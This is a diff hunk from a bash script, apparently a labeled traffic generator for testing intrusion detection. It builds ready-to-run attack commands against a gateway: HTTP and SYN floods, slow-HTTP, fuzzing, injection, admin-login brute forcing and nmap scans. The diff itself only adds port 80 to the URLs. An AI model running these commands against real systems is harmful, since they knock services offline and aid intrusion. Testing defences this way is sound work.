@@ -107,14 +107,14 @@ label_of() { [[ "$1" == "http_flood_low" ]] && echo http_flood || echo "$1"; }
 attack_cmd() {
     local a="$1" ua; ua="atk-$(label_of "$a")"
     case "$a" in
-    http_flood)      if [[ $INTENSE == 1 ]]; then echo "wrk -t4 -c 100 -d ${DUR}s -H 'User-Agent: $ua' http://$GW_HOST/";
-                     else echo "timeout -s INT $DUR sh -c 'i=0; while [ \$i -lt 10 ]; do ( while :; do curl -s -o /dev/null -A \"$ua\" http://$GW_HOST/; done ) & i=\$((i+1)); done; wait'"; fi ;;
-    http_flood_low)  echo "timeout -s INT $DUR sh -c 'while :; do curl -s -o /dev/null -A \"$ua\" http://$GW_HOST/; sleep 1; done'" ;;
-    fuzzing)         echo "timeout -s INT $DUR sh -c 'while :; do ffuf -u http://$GW_HOST/FUZZ -w /tmp/fuzz.txt -H \"User-Agent: $ua\" -rate $([[ $INTENSE == 1 ]] && echo 0 || echo 50) -maxtime $DUR -s; done'" ;;
-    injection)       echo "timeout -s INT $DUR sh -c 'while :; do while read p; do curl -s -o /dev/null -A \"$ua\" \"http://$GW_HOST/product/\$p\"; curl -s -o /dev/null -A \"$ua\" \"http://$GW_HOST/?q=\$p\"; done < /tmp/inj.txt; done'" ;;
-    brute_force)     echo "timeout -s INT $DUR sh -c 'i=0; while :; do i=\$((i+1)); curl -s -o /dev/null -A \"$ua\" -XPOST http://$GW_HOST/login -H \"Content-Type: application/json\" -d \"{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"wrong\$i\\\"}\"; done'" ;;
+    http_flood)      if [[ $INTENSE == 1 ]]; then echo "wrk -t4 -c 100 -d ${DUR}s -H 'User-Agent: $ua' http://$GW_HOST:80/";
+                     else echo "timeout -s INT $DUR sh -c 'i=0; while [ \$i -lt 10 ]; do ( while :; do curl -s -o /dev/null -A \"$ua\" http://$GW_HOST:80/; done ) & i=\$((i+1)); done; wait'"; fi ;;
+    http_flood_low)  echo "timeout -s INT $DUR sh -c 'while :; do curl -s -o /dev/null -A \"$ua\" http://$GW_HOST:80/; sleep 1; done'" ;;
+    fuzzing)         echo "timeout -s INT $DUR sh -c 'while :; do ffuf -u http://$GW_HOST:80/FUZZ -w /tmp/fuzz.txt -H \"User-Agent: $ua\" -rate $([[ $INTENSE == 1 ]] && echo 0 || echo 50) -maxtime $DUR -s; done'" ;;
+    injection)       echo "timeout -s INT $DUR sh -c 'while :; do while read p; do curl -s -o /dev/null -A \"$ua\" \"http://$GW_HOST:80/product/\$p\"; curl -s -o /dev/null -A \"$ua\" \"http://$GW_HOST:80/?q=\$p\"; done < /tmp/inj.txt; done'" ;;
+    brute_force)     echo "timeout -s INT $DUR sh -c 'i=0; while :; do i=\$((i+1)); curl -s -o /dev/null -A \"$ua\" -XPOST http://$GW_HOST:80/login -H \"Content-Type: application/json\" -d \"{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"wrong\$i\\\"}\"; done'" ;;
     malformed_http)  echo "timeout -s INT $DUR sh -c 'while :; do printf \"GARBAGE /\\\\r\\\\n\\\\r\\\\n\" | ncat -w1 $GW_HOST 80; done'" ;;
-    slow_http)       echo "slowhttptest -c $([[ $INTENSE == 1 ]] && echo 1000 || echo 200) -H -i 10 -r 50 -u http://$GW_HOST/ -l $DUR" ;;
+    slow_http)       echo "slowhttptest -c $([[ $INTENSE == 1 ]] && echo 1000 || echo 200) -H -i 10 -r 50 -u http://$GW_HOST:80/ -l $DUR" ;;
     port_scan)       if [[ $INTENSE == 1 ]]; then echo "nmap -sS -Pn -T4 -p- $TGT";
                      else echo "nmap -sT -Pn -T3 --max-rate 200 -p 1-1024,3550,5050,5000,7000,7070,8080,9555,50051,6379 $TGT"; fi ;;
     conn_flood)      if [[ $INTENSE == 1 ]]; then echo "timeout -s INT $DUR hping3 -S -p 8080 --flood $TGT";
